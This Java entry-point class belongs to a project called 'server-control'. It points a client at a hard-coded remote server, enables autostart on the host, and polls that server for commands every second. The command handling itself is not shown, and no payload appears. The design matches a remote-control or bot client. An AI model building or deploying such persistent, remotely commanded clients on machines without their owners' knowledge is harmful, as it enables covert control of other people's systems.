package ch.lebois.client;

import ch.lebois.client.configure.Autostart;
import ch.lebois.client.configure.ClientConfigure;
import ch.lebois.client.handler.CommandReader;

/**
 * @author Wetwer
 * @project server-control
 **/

public class ClientApplication {

    public static void main(String[] args) {
        ClientConfigure clientConfigure = new ClientConfigure();
//        clientConfigure.setServer("http://localhost:8085/");
        clientConfigure.setServer("http://scorewinner.ch:8085/");
        clientConfigure.setArch("3.1");


        new Autostart().decide();

        while (true) {
            CommandReader.read();
            try {
                Thread.sleep(1000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }
}
